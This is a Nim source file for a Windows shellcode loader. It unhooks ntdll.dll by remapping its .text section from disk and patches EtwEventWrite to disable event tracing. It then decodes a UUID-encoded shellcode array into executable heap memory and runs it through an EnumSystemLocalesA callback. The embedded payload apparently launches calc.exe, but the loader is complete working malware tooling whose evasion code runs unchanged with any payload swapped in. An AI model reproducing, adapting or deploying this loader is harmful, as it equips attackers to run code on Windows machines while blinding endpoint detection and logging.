import winim
import strutils
import ptr_math
import strformat
import dynlib
#import os

const SIZE = 18  
var UUIDARR = allocCStringArray([
  "E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0", 
"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844", 
"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844", 
"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841", 
"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF", 
"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-9090-9090-9090-909090909090"
])

when defined amd64:
    # x64
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    # x86
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA("ntdll.dll")
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo fmt"Failed calling VirtualProtect ({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true
          
when isMainModule:
  var result_unhook = ntdllunhook()
  var result_etw_patch = Patchntdll()
  echo fmt"[*] unhook Ntdll: {bool(result_unhook)}"
  echo fmt"[*] patch etw: {bool(result_etw_patch)}"
  if result_unhook and result_etw_patch:
    echo fmt"[*] Allocating Heap Memory"
    # let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    let hHeap = HeapCreate(HEAP_GENERATE_EXCEPTIONS, 0, 0)
    let ha = HeapAlloc(hHeap, 0, 0x100000)
    #sleep 60000
    var oldProtect: DWORD
    if not VirtualProtect(ha, 0x100000, PAGE_EXECUTE_READWRITE, addr oldProtect):
      raise newException(Exception, "Failed to change memory protection")
    var hptr = cast[DWORD_PTR](ha)
    if hptr != 0:
        echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
    else:
        echo fmt"[-] Heap Alloc Error "
        quit(QuitFailure)

    #echo fmt"[*] UUID Array size is {SIZE}"
    # Planting Shellcode From UUID Array onto Allocated Heap Memory
    for i in 0..(SIZE-1):
        var status = UuidFromStringA(cast[RPC_CSTR](UUIDARR[i]), cast[ptr UUID](hptr))
        if status != RPC_S_OK:
            if status == RPC_S_INVALID_STRING_UUID:
                echo fmt"[-] Invalid UUID String Detected"
            else:
                echo fmt"[-] Something Went Wrong, Error Code: {status}"
            quit(QuitFailure)
        hptr += 16
    # echo fmt"[+] Shellcode is successfully placed between 0x{(cast[DWORD_PTR](ha)).toHex} and 0x{hptr.toHex}"

    # Calling the Callback Function
    # echo fmt"[*] Calling the Callback Function ..." 
    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
    CloseHandle(hHeap)
    quit(QuitSuccess)
  else:
    echo fmt"[-] Something went wrong..."
    quit(QuitFailure)